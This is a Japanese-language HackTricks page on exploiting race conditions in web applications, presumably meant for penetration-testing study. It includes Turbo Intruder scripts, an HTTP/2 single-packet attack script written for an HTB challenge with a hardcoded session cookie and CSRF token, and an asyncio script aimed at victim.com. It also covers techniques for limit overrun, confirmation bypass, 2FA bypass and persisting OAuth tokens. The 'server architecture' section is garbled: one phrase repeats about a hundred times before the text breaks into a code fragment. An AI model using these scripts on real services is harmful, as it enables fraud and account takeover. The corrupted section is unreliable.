# レースコンディション

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も先進的なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>

{% hint style="warning" %}
このテクニックの深い理解を得るために、オリジナルレポートを[https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)で確認してください。
{% endhint %}

## レースコンディション攻撃の強化

レースコンディションを利用する際の主な障害は、複数のリクエストが**非常に短い時間差で処理されることを確認することです—理想的には、1ms未満**です。

ここでは、リクエストの同期に関するいくつかのテクニックを見つけることができます：

#### HTTP/2シングルパケット攻撃 vs. HTTP/1.1ラストバイト同期

* **HTTP/2**: 1つのTCP接続で2つのリクエストを送信できるため、ネットワークの揺れの影響を軽減します。ただし、サーバーサイドの変動により、2つのリクエストでは一貫したレースコンディションの攻撃ができない場合があります。
* **HTTP/1.1 'ラストバイト同期'**: 20-30のリクエストのほとんどの部分を事前に送信し、小さな断片を保留してから一緒に送信することで、サーバーへの同時到着を実現します。

**ラストバイト同期の準備**には次の手順が含まれます：

1. ストリームを終了せずに、最後のバイトを除いたヘッダーと本文データを送信します。
2. 初回送信後に100ms待機します。
3. 最終フレームをバッチ処理するためにNagleのアルゴリズムを利用するためにTCP\_NODELAYを無効にします。
4. 接続をウォームアップするためにピンポンを行います。

保留されたフレームの後続の送信は、Wiresharkを使用して単一のパケットでの到着を確認するはずです。この方法は通常、RC攻撃に関与しない静的ファイルには適用されません。

### サーバーアーキテクチャへの適応

ターゲットのアーキテクチャを理解することは重要です。フロントエンドサーバーはリクエストのルーティングを異なる方法で行う場合があり、タイミングに影響を与える可能性があります。取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、取るべき予防措置として、
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
ウェブがHTTP2をサポートしていない場合（HTTP1.1のみ）、`Engine.BURP2`の代わりに`Engine.THREADED`または`Engine.BURP`を使用してください。
{% endhint %}

* **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: RCEをトリガーするために1つのエンドポイントにリクエストを送信し、その後他のエンドポイントに複数のリクエストを送信する必要がある場合、`race-single-packet-attack.py`スクリプトを以下のように変更できます：
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* **Repeater**でも、Burp Suiteの新しい '**Send group in parallel**' オプションを使用できます。
* **limit-overrun**の場合、グループに **同じリクエストを50回** 追加するだけです。
* **接続ウォーミング**のために、Webサーバーの非静的部分にいくつかの **リクエスト** をグループの **先頭** に追加できます。
* 1つのリクエストを処理してからもう1つのリクエストを処理するまでのプロセスを **遅延** させるために、両方のリクエストの間に **追加のリクエストを追加** することができます。
* **複数のエンドポイント** RCの場合、**隠れた状態に移動するリクエスト** を送信し、その後 **50のリクエスト** を送信して **隠れた状態を悪用** します。

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **自動化されたPythonスクリプト**: このスクリプトの目的は、ユーザーのメールアドレスを変更し続けながら、新しいメールアドレスの検証トークンが最後のメールアドレスに到着するまで継続的に検証することです（これは、コード内でメールアドレスを変更できるが、最初のメールアドレスで検証が送信される可能性があるため、既に最初のメールアドレスが入力されている変数があるRCが見られたためです）。\
受信したメールに "objetivo" という単語が見つかった場合、変更されたメールの検証トークンを受信したことがわかり、攻撃を終了します。
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Raw BF

以前の研究の前に使用されたいくつかのペイロードは、RCを引き起こすために可能な限り速くパケットを送信しようとするものでした。

- **Repeater:** 前のセクションの例を確認してください。
- **Intruder**: **Intruder** に**リクエスト**を送信し、**オプションメニュー**内で**スレッド数**を**30**に設定し、ペイロードとして**Null payloads**を選択して**30**を生成します。
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

これは、**アクションを実行できる回数を制限する**場所に**現れる****脆弱性**である最も基本的な競合状態のタイプです。たとえば、ウェブストアで同じ割引コードを複数回使用することです。非常に簡単な例は[**このレポート**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)や[**このバグ**](https://hackerone.com/reports/759247)****に見つけることができます。

この種の攻撃には、次のようなバリエーションがあります：

- ギフトカードを複数回利用する
- 製品に複数回評価を付ける
- 口座残高を超過して現金を引き出すか送金する
- 単一のCAPTCHAソリューションを再利用する
- 対抗ブルートフォースレート制限をバイパスする

### **Hidden substates**

複雑な競合状態を悪用することは、隠れたまたは**意図しないマシンのサブステート**との短い機会を利用することをしばしば含みます。以下はこのアプローチ方法です：

1. **潜在的な隠れたサブステートを特定する**
   - ユーザープロファイルやパスワードリセットプロセスなどの重要なデータを変更または操作するエンドポイントを特定することから始めます。以下に焦点を当てます：
     - **ストレージ**：サーバーサイドの永続データを操作するエンドポイントを、クライアントサイドのデータを処理するものよりも優先します。
     - **アクション**：既存のデータを変更する操作を探し、新しいデータを追加する操作よりも攻撃可能な状況を作りやすいです。
     - **キー付け**：成功した攻撃は通常、同じ識別子（たとえば、ユーザー名やリセットトークン）でキー付けされた操作を含みます。
2. **初期探査を実施する**
   - 特定されたエンドポイントを競合状態攻撃でテストし、予想される結果からの逸脱を観察します。予期しない応答やアプリケーションの振る舞いの変化は、脆弱性を示す可能性があります。
3. **脆弱性をデモンストレーションする**
   - 脆弱性を悪用するために必要なリクエストの最小数に絞り込みます。多くの場合、正確なタイミングが必要なため、このステップには複数の試行や自動化が必要になるかもしれません。

### Time Sensitive Attacks

リクエストのタイミングを正確にすることで、予測可能な方法（タイムスタンプなど）がセキュリティトークンに使用されている場合、脆弱性が明らかになることがあります。たとえば、タイムスタンプに基づいてパスワードリセットトークンを生成することで、同時リクエストに対して同一のトークンを許可する可能性があります。

**悪用するには：**

- 同時にパスワードリセットリクエストを行うために、単一パケット攻撃のような正確なタイミングを使用します。同一のトークンは脆弱性を示す可能性があります。

**例：**

- 同時に2つのパスワードリセットトークンをリクエストし、それらを比較します。一致するトークンはトークン生成に欠陥があることを示唆します。

**これを試すために**[**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **をチェックしてください。**

## Hidden substates case studies

### Pay & add an Item

**支払い**を行い、**追加の**アイテムを**支払う必要がない**ようにする方法については、[**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)をチェックしてください。

### 別のメールを確認する

**メールアドレスを確認し、同時に異なるメールアドレスに変更**して、プラットフォームが新しいメールアドレスを確認するかどうかを調べます。

### 2つのメールアドレスにメールを変更する Cookieベース

[**この研究**](https://portswigger.net/research/smashing-the-state-machine)によると、Gitlabはこの方法で乗っ取りの脆弱性がある可能性があります。なぜなら、**1つのメールのメール確認トークンを他のメールに送信**する可能性があるからです。

**これを試すために**[**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **をチェックしてください。**

### 隠れたデータベース状態 / 確認バイパス

**データベースに情報を追加**するために**2つの異なる書き込み**が使用される場合、**データベースには最初のデータのみが書き込まれた状態**が一瞬存在します。たとえば、ユーザーを作成するときに**ユーザー名**と**パスワード**が**書き込まれ**、その後に新しく作成されたアカウントを確認するための**トークン**が書き込まれる場合があります。これは、一定の時間、**アカウントを確認するトークンがnull**であることを意味します。

したがって、**アカウントを登録し、空のトークン**（`token=`または`token[]=`またはその他のバリエーション）を使用してアカウントをすぐに確認するために複数のリクエストを送信することで、**メールを制御していないアカウントを確認**することができる可能性があります。

**これを試すために**[**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **をチェックしてください。**

### 2FAバイパス

次の疑似コードは、**2FAが強制されていない**状態でセッションが作成されるため、競合状態に脆弱性がある可能性があります：
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2永続的な持続性

いくつかの[**OAuthプロバイダー**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers)があります。これらのサービスを使用すると、プロバイダーが登録したユーザーを認証するアプリケーションを作成し、**クライアント**が**アプリケーションにアクセスを許可**する必要があります。これにより、**OAuthプロバイダー**内の一部のデータにアクセスするために**クライアント**が**許可**する必要があります。\
したがって、ここまでは、Google/LinkedIn/GitHubなどの一般的なログインで、次のようなページが表示されます: "_アプリケーション\<InsertCoolName>があなたの情報にアクセスすることを希望します。許可しますか？_"

#### `authorization_code`における競合状態

**問題**は、**それを受け入れ**、自動的に**`authorization_code`**を悪意のあるアプリケーションに送信すると発生します。その後、この**アプリケーションはOAuthサービスプロバイダー内の競合状態を悪用して、`authorization_code`から複数のAT/RT**（_認証トークン/リフレッシュトークン_）を生成します。基本的に、アプリケーションがデータにアクセスすることを許可したことを悪用して、**複数のアカウントを作成**します。その後、**アプリケーションにデータへのアクセスを許可するのを停止すると、1組のAT/RTが削除されますが、他のものは引き続き有効**です。

#### `Refresh Token`における競合状態

**有効なRTを取得**した後、それを悪用して複数のAT/RTを生成しようとすることができ、そして、ユーザーが悪意のあるアプリケーションにデータへのアクセス権限を取り消しても、**複数のRTは引き続き有効**です。

## **WebSocketsにおけるRC**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC)では、**並列**でWebSocketメッセージを送信するJavaのPoCを見つけることができ、**Webソケットでも競合状態を悪用**することができます。

## 参考文献

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
* **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、自分のハッキングトリックを共有する

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフローを簡単に構築**および**自動化**できます。\
今すぐアクセスしてください:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
